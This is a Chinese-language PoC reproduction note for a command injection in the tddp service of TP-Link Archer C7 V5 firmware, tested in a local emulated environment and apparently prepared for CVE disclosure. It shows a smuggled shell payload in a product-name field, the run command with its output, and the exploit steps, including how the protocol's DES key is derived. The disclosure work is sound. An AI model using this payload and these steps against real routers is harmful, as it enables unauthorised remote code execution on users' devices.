# PoC 与复现说明

## 复现性质

本复现仅用于本地授权固件仿真环境，不用于公网或未授权设备测试。

目标：

```text
TP-Link Archer C7(US) V5 firmware 220715
/usr/bin/tddp
```

验证 payload：

```text
A'$(echo TDDP_RCE>/tmp/pwned)'
```

预期结果：

```text
/tmp/pwned 被创建
文件内容为 TDDP_RCE
```

## 已准备文件

复现脚本：

```text
verify_tddpv2_hostexec_bridge.sh
```

bridge 源码：

```text
sh_bridge.c
```

证据输出：

```text
evidence_hostexec_bridge.txt
```

## 复现命令

在当前 Docker 环境中可运行：

```sh
docker exec firmrec-dev-run sh -lc 'chmod +x /root/inout/work/deepdive/tplink_tddpv2_setproduct_hostexec_bridge_2026_06_08/verify_tddpv2_hostexec_bridge.sh; /root/inout/work/deepdive/tplink_tddpv2_setproduct_hostexec_bridge_2026_06_08/verify_tddpv2_hostexec_bridge.sh'
```

最新复核已成功，输出摘要：

```text
sent=60 status=0x00
PWNED_CREATED
TDDP_RCE
```

## PoC 逻辑摘要

脚本完成以下步骤：

1. 从固件解包目录复制隔离 rootfs。
2. 将 `qemu-mips-static` 放入 rootfs。
3. 编译 `sh_bridge.c`，用于转发 `/bin/sh -c` 到 MIPS busybox shell。
4. 启动 `/usr/bin/tddp`。
5. 构造 TDDPv2 `0x52` 数据包。
6. 使用 `MD5("adminadmin")[:8]` 作为 DES key 生成协议帧。
7. 发送 UDP payload 到本地仿真服务。
8. 检查 `/tmp/pwned` 和 shell argv 日志。

## 复现判定标准

满足以下条件即可判定漏洞链成立：

- 目标 `/usr/bin/tddp` SHA256 与原固件一致。
- TDDPv2 响应状态为 `0x00`。
- `/bin/sh -c` argv 中出现带 payload 的 product name 命令模板。
- 隔离 rootfs 中 `/tmp/pwned` 被创建，内容为 `TDDP_RCE`。

## 建议补充的最终 PoC 证据

为了提高 CVE/CNA 审核通过率，建议继续补：

- 真机 LAN 侧复现日志或视频。
- 完整系统 QEMU 复现，不使用 host-exec bridge。
- `netstat` 或服务启动日志，确认 TDDPv2 监听端口和网络暴露面。
- 出厂默认状态下是否需要登录、配对或特殊密钥。

